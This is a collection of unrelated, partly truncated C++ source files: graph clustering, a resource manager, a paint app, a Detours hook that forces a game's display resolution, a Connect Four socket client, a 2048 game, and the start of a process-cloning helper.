    "\n#include \"gft_graphclustering.h\"\n\nnamespace gft{\n  namespace Graph{\n\n\n    int *DivisiveClusteringByMST(sGraph *G, int c){\n      sPQueue32 *Q;\n      sQueue *F;\n      int *label, *pred, *cost;\n      int p,q, Wmax, i;\n      int S[2];\n      S[0] = 1;\n      S[1] = 0;\n      label = gft::AllocIntArray(G->nnodes);\n      pred  = gft::AllocIntArray(G->nnodes);\n      cost  = gft::AllocIntArray(G->nnodes);\n      for(p = 0; p < G->nnodes; p++)\n\tlabel[p] = NIL;\n      label[0] = 0;\n      gft::ift::IFT_fw(G, S, label, cost, pred);\n      \n      Wmax = GetMaximumArc(G);\n      Q = PQueue32::Create(Wmax+2, G->nnodes, cost);\n\n      for(p = 1; p < G->nnodes; p++)\n\tPQueue32::FastInsertElem(Q, p);\n      i = 0;\n      while(!PQueue32::IsEmpty(Q) && i < c-1) {\n\tp = PQueue32::FastRemoveMaxFIFO(Q);\n\tpred[p] = NIL;\n\ti++;\n      }\n      PQueue32::Destroy(&Q);\n\n      F = Queue::Create(G->nnodes);\n      for(p = 0; p < G->nnodes; p++)\n\tlabel[p] = NIL;\n      i = 0;\n      for(p = 0; p < G->nnodes; p++){\n\tif(pred[p] == NIL){\n\t  Queue::Push(F, p);\n\t  label[p] = i;\n\t  i++;\n\t}\n      }\n\n      while(!Queue::IsEmpty(F)){\n\tp = Queue::Pop(F);\n\tfor(i = 0; i < G->nodes[p].outdegree; i++){\n\t  q = G->nodes[p].adjList[i];\n\t  if(pred[q] == p){\n\t    label[q] = label[p];\n\t    Queue::Push(F, q);\n\t  }\n\t}\n      }\n      Queue::Destroy(&F);\n      gft::FreeIntArray(&pred);\n      gft::FreeIntArray(&cost);\n      return label;\n    }\n\n\n    int GetNodeIndex(sGraph *G, int id){\n      int p;\n      for(p = 0; p < G->nnodes; p++)\n\tif(G->nodes[p].id == id)\n\t  return p;\n      return NIL;\n    }\n\n\n\n    int ComputeDCCsize(sGraph *G, int energy, int p){\n      gft::sQueue *Q;\n      gft::sBMap *B;\n      int size, q,i,w;\n      Q = gft::Queue::Create(G->nnodes);\n      B = gft::BMap::Create(G->nnodes);\n      gft::Queue::Push(Q, p);\n      gft::BMap::Set1(B, p);\n      size = 1;\n      while(!gft::Queue::IsEmpty(Q)){\n\tp = gft::Queue::Pop(Q);\n\tfor(i = 0; i < G->nodes[p].outdegree; i++){\n\t  q = G->nodes[p].adjList[i];\n\t  w = G->nodes[p].Warcs[i];\n\t  if(w != NIL && w < energy && gft::BMap::Get(B, q)==0){\n\t    gft::Queue::Push(Q, q);\n\t    gft::BMap::Set1(B, q);\n\t    size++;  \n\t  }\n\t}\n      }\n      gft::Queue::Destroy(&Q);\n      gft::BMap::Destroy(&B);\n      return size;\n    }\n\n\n\n    gft::sImage32 *ComputeEnegyMap_UOIFT(gft::sImage32 *spixels, sGraph *G){\n      gft::sImage32 *energy;\n      sGraph *T;\n      int S[3];\n      int nnodes, p, lb;\n      int *label, *cost;\n      S[0] = 1;\n      S[1] = 0;\n      nnodes = G->nnodes;\n      energy = gft::Image32::Create(spixels);\n      label = gft::AllocIntArray(nnodes);\n      cost  = gft::AllocIntArray(nnodes);\n      for(p = 0; p < nnodes; p++)\n\tlabel[p] = NIL;\n      label[0] = 0;\n      T = Transpose(G);\n      ift::IFT_fw(T, S, label, cost);\n      Destroy(&T);\n\n      for(p = 0; p < spixels->n; p++){\n\tlb = spixels->data[p];\n\tenergy->data[p] = cost[lb];\n      }\n      gft::FreeIntArray(&label);\n      gft::FreeIntArray(&cost);\n      return energy;\n    }\n   \n\n    int *DivisiveClusteringByOIFT(sGraph *G, int c){\n      sPQueue32 *Q;\n      sClusteringTree *tree;\n      int *label, *cost, *oift_label;\n      sGraph *T;\n      int n,i,Wmax,lb,p,q,t,l,nnodes;\n      int S[3];\n      int *hist, *mapping;\n      tree = (sClusteringTree *)malloc(sizeof(sClusteringTree)*c*2);\n      if(tree == NULL){\n\tprintf(\"Error: DivisiveClusteringByOIFT\\n\");\n\texit(1);\n      }\n      for(i = 0; i < c*2; i++){\n\ttree[i].G = NULL;\n\ttree[i].right = NIL;\n\ttree[i].left = NIL;\n      }\n      tree[0].G = gft::Graph::Clone(G);\n      tree[0].seed = 0;\n      n = 1;\n\n      S[0] = 1;\n      S[1] = 0;\n      nnodes = G->nnodes;\n      label = gft::AllocIntArray(nnodes);\n      cost  = gft::AllocIntArray(nnodes);\n      for(p = 0; p < nnodes; p++)\n\tlabel[p] = NIL;\n      label[0] = 0;\n      T = Transpose(G);\n      ift::IFT_fw(T, S, label, cost);\n      Destroy(&T);\n\n      Wmax = GetMaximumArc(G);\n      Q = PQueue32::Create(Wmax+2, nnodes, cost);\n\n      for(p = 1; p < G->nnodes; p++)\n\tPQueue32::FastInsertElem(Q, p);\n      i = 0;\n      while(!PQueue32::IsEmpty(Q) && i < c-1) {\n\tp = PQueue32::FastRemoveMaxFIFO(Q);\n\t\n\t//printf(\"2) size: %d, cost: %d\\n\",ComputeDCCsize(G, cost[p], p), cost[p]);\n\n\tlb = label[p];\n\toift_label = gft::AllocIntArray(tree[lb].G->nnodes);\n\tT = Transpose(tree[lb].G);\n\tS[0] = 2;\n\tS[1] = tree[lb].seed;\n\tS[2] = GetNodeIndex(tree[lb].G, p);\n\tq = tree[lb].G->nodes[S[1]].id;\n\tfor(t = 0; t < tree[lb].G->nnodes; t++)\n\t  oift_label[t] = NIL;\n\toift_label[S[1]] = 0;\n\toift_label[S[2]] = 1;\n\tift::OIFT(tree[lb].G, T, S, oift_label);\n\tDestroy(&T);\n\n\ttree[n].G = Split(&(tree[lb].G), oift_label, 1);\n\ttree[n+1].G = tree[lb].G;\n\ttree[n].seed   = GetNodeIndex(tree[n].G,   p);\n\ttree[n+1].seed = GetNodeIndex(tree[n+1].G, q);\n\ttree[lb].G = NULL;\n\ttree[lb].left = n;\n\ttree[lb].right = n+1;\n\tfor(t = 0; t < tree[n].G->nnodes; t++)\n\t  label[tree[n].G->nodes[t].id] = n;\n\tfor(t = 0; t < tree[n+1].G->nnodes; t++)\n\t  label[tree[n+1].G->nodes[t].id] = n+1;\n\tn += 2;\n\tgft::FreeIntArray(&oift_label);\n\n\ti++;\n      }\n      PQueue32:",
    "#include \"ResourceManager.h\"\n\nResourceManager ResourceManager::instance = ResourceManager();\n\nResourceManager::ResourceManager()\n{\n}\n\nResourceManager::~ResourceManager()\n{\n}\n\nResourceManager *ResourceManager::getInstance()\n{\n    return &instance;\n}\n\nWImage *ResourceManager::loadImage(string filename, bool alpha)\n{\n\n    if (resources.find(filename) == resources.end())\n    {\n        resources[filename] = new WImage(filename, alpha);\n    }\n\n    WImage *image = dynamic_cast<WImage *>(resources[filename]);\n\n    if (image != 0)\n    {\n        image->load();\n    }\n\n    return image;\n}\n\nWMusic *ResourceManager::loadMusic(string filename)\n{\n\n    if (resources.find(filename) == resources.end())\n    {\n        resources[filename] = new WMusic(filename);\n    }\n\n    WMusic *music = dynamic_cast<WMusic *>(resources[filename]);\n\n    if (music != 0)\n    {\n        music->load();\n    }\n\n    return music;\n}\n\nWSound *ResourceManager::loadSound(string filename)\n{\n\n    if (resources.find(filename) == resources.end())\n    {\n        resources[filename] = new WSound(filename);\n    }\n\n    WSound *sound = dynamic_cast<WSound *>(resources[filename]);\n\n    if (sound != 0)\n    {\n        sound->load();\n    }\n\n    return sound;\n}\n\nWFile *ResourceManager::loadFile(string filename)\n{\n\n    if (resources.find(filename) == resources.end())\n    {\n        resources[filename] = new WFile(filename);\n    }\n\n    WFile *file = dynamic_cast<WFile *>(resources[filename]);\n\n    if (file != 0)\n    {\n        file->load();\n    }\n\n    return file;\n}\n\nvoid ResourceManager::free(WResource *resource)\n{\n    if (resource == 0)\n    {\n        return;\n    }\n    if (resource->unload() == 0)\n    {\n        resources.erase(resource->getName());\n        delete resource;\n    }\n}\n",
    "#define OLC_PGE_APPLICATION\n#include \"olcPixelGameEngine.h\"\n#include <olectl.h>\n#include <atlbase.h>\n#include <atlconv.h>\n\nclass Example : public olc::PixelGameEngine\n{\npublic:\n\tExample()\n\t{\n\t\tsAppName = \"Paint\";\n\t}\n\npublic:\n\tolc::Sprite* sprTools[4];\n\tolc::Sprite* sprTrash;\n\n\t/*struct sPixel\n\t{\n\t\tint x;\n\t\tint y;\n\t\tolc::Pixel col;\n\t};\n\n\tstd::list<sPixel> listPixel;*/\n\n\tPOINT GetMousePosSystem() {\n\t\tstatic POINT ptMouse;\n\t\tGetCursorPos(&ptMouse);\n\t\t//ScreenToClient(olc::windowHandle, &ptMouse);\n\n\t\t//ptMouse.x = clamped(ptMouse.x, 1, GetSystemMetrics(SM_CXSCREEN));\n\t\t//ptMouse.y = clamped(ptMouse.y, 1, GetSystemMetrics(SM_CYSCREEN));\n\t\tstatic POINT finMouse;\n\t\tfinMouse.x = ptMouse.x;\n\t\tfinMouse.y = ptMouse.y;\n\n\t\treturn finMouse;\n\t}\n\n\tbool Holding(int iXStart, int iYStart, int iWidth, int iHeight, DWORD key) {\n\t\tif (GetAsyncKeyState(key)) // && hwWindow == GetActiveWindow()\n\t\t\tif (Hovering(iXStart, iYStart, iWidth, iHeight))\n\t\t\t\treturn true;\n\n\t\treturn false;\n\t}\n\n\tbool Hovering(int iXStart, int iYStart, int iWidth, int iHeight) {\n\t\tint mouseX = GetMouseX();\n\t\tint mouseY = GetMouseY();\n\n\t\tif (mouseX >= iXStart && iWidth - 1 >= mouseX)\n\t\t\tif (mouseY >= iYStart && iHeight - 1 >= mouseY)\n\t\t\t\treturn true;\n\n\t\treturn false;\n\t}\n\n\tbool Clicked(int iXStart, int iYStart, int iWidth, int iHeight, int mouseButton) {\n\t\tif (GetMouse(mouseButton).bPressed)\n\t\t\tif (Hovering(iXStart, iYStart, iWidth, iHeight))\n\t\t\t\treturn true;\n\n\t\treturn false;\n\t}\n\n\tbool bRenderedSlider;\n\tbool bDrawingSlider;\n\tbool bSetArrows;\n\n\tvoid drawHUESlider(float x, float y, float w, float h) {\n\t\tconst olc::vd2d ptMouse = GetMousePos();\n\n\t\tDrawRect(int(x) - 1, int(y) - 1, int(w) + 1, int(h) + 1, olc::BLACK);\n\n\t\tif (!bRenderedSlider) {\n\t\t\tredrawColorPicker();\n\n\t\t\tfor (int i = 0; i < int(w) - 1; i++) {\n\t\t\t\tconst olc::Pixel currentCol = olc::FromHsv(i * 360 / w, 1, 1);\n\t\t\t\tDrawRect(int(x) + i, int(y), 1, int(h) - 1, currentCol);\n\t\t\t}\n\n\t\t\tbRenderedSlider = true;\n\n\t\t\tif (!bSetArrows) {\n\t\t\t\tfor (int i = 0; i < 10; i++) {\n\t\t\t\t\tsliderColValue[i] = olc::RED;\n\t\t\t\t\tsliderValue[i] = int(x);\n\t\t\t\t}\n\n\t\t\t\tbSetArrows = true;\n\t\t\t}\n\t\t}\n\n\t\tfor (int i = 0; i < w - 1; i++) {\n\t\t\tconst olc::Pixel currentCol = olc::FromHsv(olc::clamped(i * 360 / w, 0, 360), 1, 1);\n\n\t\t\tif (GetAsyncKeyState(VK_LBUTTON) && Hovering(int(x), int(y), int(x + w), int(y + h))) {\n\t\t\t\tredrawColorPicker();\n\n\t\t\t\tconst float hueResult = (float((ptMouse.x)) - x) * 360 / w - 1;\n\t\t\t\tsliderColValue[selColIndex] = olc::FromHsv(hueResult, 1, 1);\n\t\t\t\tselHue[selColIndex] = hueResult; //map slider to 0-360 (hue range)\n\t\t\t\tsliderValue[selColIndex] = int(ptMouse.x);\n\t\t\t}\n\t\t}\n\n\t\t//let's overlay this smooth decal, it looks nice\n\t\tDrawDecal(x, y, gfxHue.Decal(), { 0.2128f, 0.216f });\n\n\t\t//DrawString(100, 188, std::to_string(sliderColValue[selColIndex].r) + \"-\" + std::to_string(sliderColValue[selColIndex].g) + \"-\" + std::to_string(sliderColValue[selColIndex].b), olc::BLACK);\n\t\t//DrawString(100, 205, std::to_string(sliderValue[selColIndex]), olc::BLACK);\n\t\t//DrawString(100, 205, std::to_string(selHue), olc::BLACK);\n\n\t\tDrawRotatedDecal({ float(sliderValue[selColIndex]), float(y + h) + 2 }, gfxMouse.Decal(), 0.75f, { 0, 0 }, { 0.125, 0.125 }, sliderColValue[selColIndex]);\n\t\t//FillCircle(sliderValue[selColIndex], y + h / 2, 1, olc::BLACK);\n\t\t//FillTriangle(sliderValue[selColIndex], y + h + 2, sliderValue[selColIndex] - 3, y + h + 7, sliderValue[selColIndex] + 3, y + h + 7, olc::BLACK); //sliderCol\n\t}\n\n\tolc::Pixel myCols[10];\n\tolc::vd2d colSelectionPoint[10];\n\tolc::Pixel sliderColValue[10];\n\tint sliderValue[10];\n\tint selColIndex;\n\tfloat selHue[10];\n\n\tvoid drawMyColors(int x, int y, int size) {\n\t\tfor (int i = 0; i < 10; i++) {\n\t\t\t//create a mapped white / black color based on our picker y selection\n\t\t\tconst int invertedCol = int((colSelectionPoint[i].y - picker.y) * 255 / pickerSize.y);\n\n\t\t\tif (Hovering(x + 102, y, x + 102 + size, y + size)) {\n\t\t\t\tif (GetMouse(0).bPressed) {\n\t\t\t\t\tredrawColorPicker();\n\t\t\t\t\tselColIndex = i;\n\t\t\t\t}\n\t\t\t\telse if (GetMouse(1).bPressed) {\n\t\t\t\t\tredrawColorPicker();\n\n\t\t\t\t\t// select black and white with right click\n\t\t\t\t\tif (invertedCol > 250)\n\t\t\t\t\t\tcolSelectionPoint[i] = { picker.x + 1, picker.y + 1 };\n\t\t\t\t\telse\n\t\t\t\t\t\tcolSelectionPoint[i] = { picker.x + pickerSize.x - 1, picker.y + pickerSize.y - 1 };\n\n\t\t\t\t\tpickerCircleSize[i] = 1;\n\t\t\t\t\tselColIndex = i;\n\t\t\t\t}\n\t\t\t}\n\n\t\t\tDrawRect(x + 102, y + 1, size, size, olc::BLACK);\n\t\t\tFillRect(x + 103, y + 2, size - 1, size - 1, myCols[i]);\n\n\t\t\t//selected palette marker\n\t\t\tif (selColIndex == i)\n\t\t\t\tFillCircle(x + 105, y + 4, 1, olc::Pixel(invertedCol, invertedCol, invertedCol, 255));\n\n\t\t\ty += 10;\n\t\t}\n\t}\n\n\tolc::Pixel darker(uint8_t& r, uint8_t& g, uint8_t& b, int& a) {\n\t\tconst float FACTOR = .7f;\n\n\t\treturn olc::Pixel(std::max((int)(r * FACTOR), 0),\n\t\t\tstd::max((int)(g * FACTOR), 0),\n\t\t\tstd::max((int)(b * FACTOR), 0),\n\t\t\ta);\n\t}\n\n\tolc::Pixel brighter(uint8_t& r, uint8_t& g, uint8_t& b, int& a) {\n\t\tconst float FACTOR = 4.7f;\n\n\t\tint i = (int)(1.0 / (1.0 - FACTOR));\n\t\tif (r == 0 ",
    "#include <windows.h>\n#include \"detours.h\"\n#include <iostream>\n#include <tlhelp32.h> \n#pragma comment(lib, \"detours.lib\") \n\nVOID __declspec(dllexport)myfix()\n{\n\n}\n\nstatic decltype(&ChangeDisplaySettingsExA) TrueChangeDisplaySettingsExA = ChangeDisplaySettingsExA;\n\nDEVMODEA g_OriginalDevMode;\nbool g_DevModeSaved = false;\nHANDLE hMonitorThread = NULL;\nvolatile bool bMonitorThreadRunning = false;\n\n\nBOOL IsProcessRunning(DWORD pid)\n{\n    HANDLE hProcessSnap;\n    BOOL bRet = FALSE;\n\n    PROCESSENTRY32 pe32 = { 0 };\n    pe32.dwSize = sizeof(PROCESSENTRY32);\n\n    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n    if (hProcessSnap == INVALID_HANDLE_VALUE) return FALSE;\n\n    if (Process32First(hProcessSnap, &pe32))\n    {\n        do\n        {\n            if (pe32.th32ProcessID == pid)\n            {\n                bRet = TRUE;\n                break;\n            }\n        } while (Process32Next(hProcessSnap, &pe32));\n    }\n\n    CloseHandle(hProcessSnap);\n    return bRet;\n}\n\nLONG WINAPI MyChangeDisplaySettingsExA(\n    LPCSTR lpszDeviceName,\n    DEVMODEA* lpDevMode,\n    HWND hwnd,\n    DWORD dwflags,\n    LPVOID lParam)\n{\n    if (lpDevMode && !g_DevModeSaved)\n    {\n        ZeroMemory(&g_OriginalDevMode, sizeof(DEVMODEA));\n        g_OriginalDevMode.dmSize = sizeof(DEVMODEA);\n        if (EnumDisplaySettingsA(lpszDeviceName, ENUM_CURRENT_SETTINGS, &g_OriginalDevMode))\n        {\n            g_DevModeSaved = true;\n        }\n    }\n\n    if (lpDevMode)\n    {\n        lpDevMode->dmPelsWidth = 800;\n        lpDevMode->dmPelsHeight = 600;\n        lpDevMode->dmFields = DM_PELSWIDTH | DM_PELSHEIGHT;\n    }\n\n    return TrueChangeDisplaySettingsExA(lpszDeviceName, lpDevMode, hwnd, dwflags, lParam);\n}\n\nBOOL IsWindowFullScreen(HWND hwnd)\n{\n    if (hwnd == NULL) return FALSE;\n\n    RECT windowRect, desktopRect;\n    GetWindowRect(hwnd, &windowRect);\n    GetWindowRect(GetDesktopWindow(), &desktopRect);\n\n    bool sizeMatches = (windowRect.left == desktopRect.left &&\n        windowRect.top == desktopRect.top &&\n        windowRect.right == desktopRect.right &&\n        windowRect.bottom == desktopRect.bottom);\n\n    LONG style = GetWindowLong(hwnd, GWL_STYLE);\n    LONG exStyle = GetWindowLong(hwnd, GWL_EXSTYLE);\n\n    \n    bool hasBordersOrTitle = style & (WS_CAPTION | WS_THICKFRAME);\n    bool hasWindowEdgeStyles = exStyle & (WS_EX_WINDOWEDGE | WS_EX_CLIENTEDGE | WS_EX_STATICEDGE);\n\n   \n    if ((sizeMatches && !hasBordersOrTitle) && !hasWindowEdgeStyles) {\n        return TRUE; \n    }\n    else {\n        return FALSE; \n    }\n}\n\nHWND FindGameWindow()\n{\n    return FindWindow(L\"harutoma.wndclass\", L\"SkyFish\");\n}\n\nDWORD WINAPI MonitorGameState(LPVOID lpParam)\n{\n    DWORD dwGamePID = GetCurrentProcessId();\n    HWND hGameWnd = NULL;\n    bool wasFullScreen = false; \n\n    while (bMonitorThreadRunning)\n    {\n        Sleep(1000); \n\n        hGameWnd = FindGameWindow();\n        if (!IsProcessRunning(dwGamePID) || hGameWnd == NULL)\n        {\n            bMonitorThreadRunning = false; \n            if (g_DevModeSaved)\n            {\n                ChangeDisplaySettingsExA(NULL, &g_OriginalDevMode, NULL, CDS_UPDATEREGISTRY, NULL);\n                std::cout << \"Resolution restored as game exited or window not found.\" << std::endl;\n                g_DevModeSaved = false;\n            }\n        }\n        else\n        {\n            bool isCurrentFullScreen = IsWindowFullScreen(hGameWnd);\n            if (wasFullScreen && !isCurrentFullScreen)\n            {\n                ChangeDisplaySettingsExA(NULL, &g_OriginalDevMode, NULL, CDS_UPDATEREGISTRY, NULL);\n                std::cout << \"Resolution restored due to game transitioning from fullscreen to windowed mode.\" << std::endl;\n                g_DevModeSaved = false;\n                bMonitorThreadRunning = false; \n            }\n            wasFullScreen = isCurrentFullScreen; \n        }\n    }\n\n    return 0;\n}\n\n\nbool InstallHooks()\n{\n    DetourRestoreAfterWith();\n\n    DetourTransactionBegin();\n    DetourUpdateThread(GetCurrentThread());\n\n    DetourAttach(&(PVOID&)TrueChangeDisplaySettingsExA, MyChangeDisplaySettingsExA);\n\n    if (DetourTransactionCommit() == NO_ERROR)\n    {\n        \n        bMonitorThreadRunning = true;\n        hMonitorThread = CreateThread(NULL, 0, MonitorGameState, NULL, 0, NULL);\n        return true;\n    }\n    return false;\n}\n\nvoid RemoveHooks()\n{\n    DetourTransactionBegin();\n    DetourUpdateThread(GetCurrentThread());\n    DetourDetach(&(PVOID&)TrueChangeDisplaySettingsExA, MyChangeDisplaySettingsExA);\n    DetourTransactionCommit();\n\n   \n    if (hMonitorThread != NULL)\n    {\n        bMonitorThreadRunning = false;\n        WaitForSingleObject(hMonitorThread, INFINITE);\n        CloseHandle(hMonitorThread);\n    }\n\n    \n    if (g_DevModeSaved)\n    {\n        ChangeDisplaySettingsExA(NULL, &g_OriginalDevMode, NULL, CDS_UPDATEREGISTRY, NULL);\n        std::cout << \"Resolution restored on DLL detach.\" << std::endl;\n        g_DevModeSaved = false;\n    }\n}\n\nBOOL APIENTRY DllMain(HMODULE hModule, DWORD ",
    "#include <iostream>\n#include <string>\n#include <unistd.h>\n#include <arpa/inet.h>\n#include <cstring>  \n\n#define MAX_BUFFER 1024\n\nusing namespace std;\n\nvoid mostrarTablero(const string &tablero) {\n    cout << tablero << endl;\n}\n\nint main(int argc, char* argv[]) {\n    if (argc != 3) {\n        cout << \"Uso: \" << argv[0] << \" <IP> <puerto>\" << endl;\n        return 1;\n    }\n\n    const char* ip = argv[1];\n    int puerto = atoi(argv[2]);\n\n    // Crear el socket del cliente\n    int socketCliente = socket(AF_INET, SOCK_STREAM, 0);\n    if (socketCliente == -1) {\n        cerr << \"Error al crear el socket del cliente\" << endl;\n        return 1;\n    }\n\n    // Configurar la direcci\u00f3n del servidor\n    sockaddr_in direccionServidor;\n    direccionServidor.sin_family = AF_INET;\n    direccionServidor.sin_port = htons(puerto);\n    inet_pton(AF_INET, ip, &direccionServidor.sin_addr);\n\n    // Conectar al servidor\n    if (connect(socketCliente, (sockaddr*)&direccionServidor, sizeof(direccionServidor)) == -1) {\n        cerr << \"Error al conectar al servidor\" << endl;\n        return 1;\n    }\n\n    char buffer[MAX_BUFFER];\n    while (true) {\n        // Recibir mensaje del servidor\n        int bytesRecibidos = recv(socketCliente, buffer, sizeof(buffer) - 1, 0);\n        if (bytesRecibidos <= 0) {\n            break;\n        }\n        buffer[bytesRecibidos] = '\\0';\n\n        // Mostrar mensaje recibido\n        cout << buffer << endl;\n\n        // Si el mensaje pide una jugada, solicitar al usuario\n        if (strstr(buffer, \"Ingrese la columna\")) {\n            int columna;\n            cout << \"Columna: \";\n            cin >> columna;\n            string jugada = to_string(columna) + \"\\n\";\n            send(socketCliente, jugada.c_str(), jugada.length(), 0);\n        }\n    }\n\n    // Cerrar el socket del cliente\n    close(socketCliente);\n\n    return 0;\n}\n",
    "#include <iostream>  \n#include <vector>  \n#include <cstdlib>  \n#include <ctime>  \n#include <iomanip>\n#include <fstream>\n#include <algorithm>\n#include <ctime>\n#include <string>\n\nusing namespace std;\nstruct Data {\n    int score;\n    int size;\n    long time;\n};\n  \nData dat = {0, 4, 0};\n\nvector<vector<int>> grid(4, vector<int>(4));\n\nvoid msg(int &i)\n{\n    if (i == 2048)  std::cout << \"You reached 2048!\" << '\\n';  \n}\n\n#ifdef _WIN32  \n    #define byte WindowsByte // \u6216\u8005\u5176\u4ed6\u4e0d\u4f1a\u4e0e std::byte \u51b2\u7a81\u7684\u540d\u5b57  \n    #include <windows.h> // x86_64-w64-mingw32-g++ ./2048.cpp -static on ubuntu and the terminal should support ANSI(Windows Terminal, ConEmu, Cygwin)\n    #define SLEEP(ms) Sleep(ms)  \n#elif __linux__\n    #include <termios.h>\n    #include <unistd.h>\n    #define SLEEP(ms) usleep(ms * 1000)\n#endif\n\nvector<int> v;\nvoid mergeUp(bool& sliped) {  \n    std::vector<int*> column;   \n    for (int col = 0; col < dat.size; ++col) {   \n        v.clear();\n        for (int i = 0; i < dat.size; ++i)  v.push_back(grid[i][col]);\n\n        column.clear(); // \u6e05\u9664\u4e0a\u4e00\u5217\u7684\u6307\u9488\n        for (int row = 0; row < dat.size; ++row) {    \n            if (grid[row][col] != 0)  \n                column.push_back(&grid[row][col]);\n        }  \n    \n        // \u5982\u679c\u5217\u4e2d\u6ca1\u6709\u6570\u5b57\uff0c\u5219\u8df3\u8fc7  in loops(for, while)\n        if (column.empty()) continue;  \n\n        size_t idx = 0;    \n        while (idx < column.size() - 1) {    \n            if (*column[idx] == *column[idx + 1]) {   \n                                sliped = true; \n \n                *column[idx] *= 2; // \u5408\u5e76\u76f8\u540c\u7684\u6570\u5b57  \n                dat.score += *column[idx];\n                // \u6ce8\u610f\uff1a\u5220\u9664\u4e0b\u4e00\u4e2a\u5143\u7d20\u540e\uff0c\u4e0d\u9700\u8981\u518d\u6b21\u589e\u52a0idx\uff0c\u56e0\u4e3a\u4e0b\u4e00\u4e2a\u5143\u7d20\u4f1a\u79fb\u52a8\u5230\u5f53\u524d\u4f4d\u7f6e  \n                column.erase(column.begin() + idx + 1); // \u79fb\u9664\u5df2\u5408\u5e76\u7684\u6570\u5b57    \n\n                // \u5982\u679c\u5408\u5e76\u540e\u7684\u6570\u5b57\u7b49\u4e8e2048\uff0c\u8f93\u51fa\u6d88\u606f  \n                msg(*column[idx]);  \n            } else ++idx;  \n        }  \n    \n        // \u5c06\u5408\u5e76\u540e\u7684\u6570\u5b57\u653e\u56degrid\u4e2d  \n        idx = 0; \n        for (int row = 0; row < dat.size; ++row) {    \n            if (idx < column.size()) {  \n                grid[row][col] = *column[idx++]; // \u53ea\u5728column\u4e2d\u6709\u503c\u65f6\u8d4b\u503c\uff0c\u5426\u5219\u4e3a0  \n            } else {  \n                grid[row][col] = 0; // \u5982\u679ccolumn\u4e2d\u7684\u503c\u90fd\u7528\u5b8c\u4e86\uff0c\u5219\u5269\u4f59\u7684\u884c\u90fd\u4e3a0  \n            }  \n        } \n        for (int i = 0; i < dat.size; ++i)  if (grid[i][col] != v[i])   {\n            sliped = true;\n            break;\n        }\n    }\n\n}  \n\nvoid mergeLeft(bool& sliped) {  \n    std::vector<int*> rows; \n    for (int row = 0; row < dat.size; ++row) {  \n        v.clear();\n        for (int i = 0; i < dat.size; ++i)  v.push_back(grid[row][i]);\n\n        rows.clear();\n        for (int col = 0; col < dat.size; ++col) {  \n            if (grid[row][col] != 0)\n                rows.push_back(&grid[row][col]);  \n        }\n\n        // \u5982\u679c\u5217\u4e2d\u6ca1\u6709\u6570\u5b57\uff0c\u5219\u8df3\u8fc7  \n        if (rows.empty()) continue;  \n        // \u5408\u5e76temp\u4e2d\u7684\u6570\u5b57  \n        size_t idx = 0;  \n        while (idx < rows.size() - 1) {  \n            if (*rows[idx] == *rows[idx + 1]) {  \n                sliped = true; \n\n                *rows[idx] *= 2; // \u5408\u5e76\u76f8\u540c\u7684\u6570\u5b57  \n                dat.score += *rows[idx];  \n                rows.erase(rows.begin() + idx + 1); // \u79fb\u9664\u5df2\u5408\u5e76\u7684\u6570\u5b57  \n  \n                // \u5982\u679c\u5408\u5e76\u540e\u7684\u6570\u5b57\u7b49\u4e8e2048\uff0c\u8f93\u51fa\u6d88\u606f\u5e76\u7ed3\u675f\u5faa\u73af  \n                msg(*rows[idx]);\n            }  else ++idx;  \n        }  \n\n        idx = 0;\n        // \u5c06\u5408\u5e76\u540e\u7684\u6570\u5b57\u653e\u56denewGrid\u4e2d  \n        for (int col = 0; col < dat.size; ++col) {  \n            if (idx < rows.size())    \n            {\n                grid[row][col] = *rows[idx++];\n            }\n            else grid[row][col] = 0;\n        }  \n        for (int i = 0; i < dat.size; ++i)  if (grid[row][i] != v[i])   {sliped = true; break;}\n    }\n}  \n\nvoid mergeDown(bool& sliped) {\n    vector<int*> column;\n    for (int col = 0; col < dat.size; ++col) {\n        v.clear();\n        for (int i = 0; i < dat.size; ++i)  v.push_back(grid[i][col]);\n\n        column.clear();\n        for (int row = dat.size-1; row >= 0; --row) {  \n            if (grid[row][col] != 0)\n                column.push_back(&grid[row][col]);  \n        }\n\n        if (column.empty()) continue;  \n\n        // \u5408\u5e76temp\u4e2d\u7684\u6570\u5b57  \n        size_t idx = 0;  \n        while (idx < column.size() - 1) {  \n            if (*column[idx] == *column[idx + 1]) {  \n                *column[idx] *= 2; // \u5408\u5e76\u76f8\u540c\u7684\u6570\u5b57  \n                dat.score += *column[idx];  \n                column.erase(column.begin() + idx + 1); // \u79fb\u9664\u5df2\u5408\u5e76\u7684\u6570\u5b57  \n  \n                // \u5982\u679c\u5408\u5e76\u540e\u7684\u6570\u5b57\u7b49\u4e8e2048\uff0c\u8f93\u51fa\u6d88\u606f\u5e76\u7ed3\u675f\u5faa\u73af  \n                msg(*column[idx]);\n\n            }  else ++idx;  \n        }\n\n        idx = 0;\n\n        // \u5c06\u5408\u5e76\u540e\u7684\u6570\u5b57\u653e\u56denewGrid\u4e2d  \n        for (int row = dat.size-1; row >= 0; --row) {  \n            if (idx < column.size())    \n            {\n                grid[row][col] = *column[idx++];              \n            }\n            else grid[row][col] = 0;\n        }  \n        for (int i = 0; i < dat.size; ++i)  if (grid[i][col] != v[i])   {sliped = true; break;}\n    }\n}  \n\nvoid mergeRight(bool& sliped) {  \n    vector<int*> rows;\n    for (int row = 0; row < dat.size; ++row) {  \n        v.clear();\n        for (int i = 0; i < dat.size; ++i)  v.push_back(grid[row][i]);\n",
    "#include \"stdafx.h\"\n#include \"resource.h\"\n\nEXTERN_C_START\n\nNTSYSAPI\nNTSTATUS\nNTAPI\nRtlPrepareForProcessCloning();\n\nNTSYSAPI\nNTSTATUS\nNTAPI\nRtlCompleteProcessCloning(_In_ BOOL bCloned);\n\nEXTERN_C_END\n\nint ShowErrorBox(HWND hwnd, NTSTATUS status, PCWSTR lpCaption, UINT uType)\n{\n\tint r = 0;\n\n\tPWSTR lpText;\n\tif (FormatMessageW(FORMAT_MESSAGE_FROM_HMODULE | FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_IGNORE_INSERTS, \n\t\tGetModuleHandle(L\"ntdll\"), status, 0, (PWSTR)&lpText, 0, 0))\n\t{\n\t\tr = MessageBoxW(hwnd, lpText, lpCaption, uType);\n\t\tLocalFree(lpText);\n\t}\n\n\treturn r;\n}\n\nNTSTATUS CloneUserProcess(_Out_ PHANDLE ProcessHandle,\n\t_Out_ PHANDLE ThreadHandle,\n\t_In_ BOOL bSynchronize,\n\t_In_ ULONG ProcessFlags, // PROCESS_CREATE_FLAGS_*\n\t_In_ ULONG ThreadFlags // THREAD_CREATE_FLAGS_*\n)\n{\n\tNTSTATUS 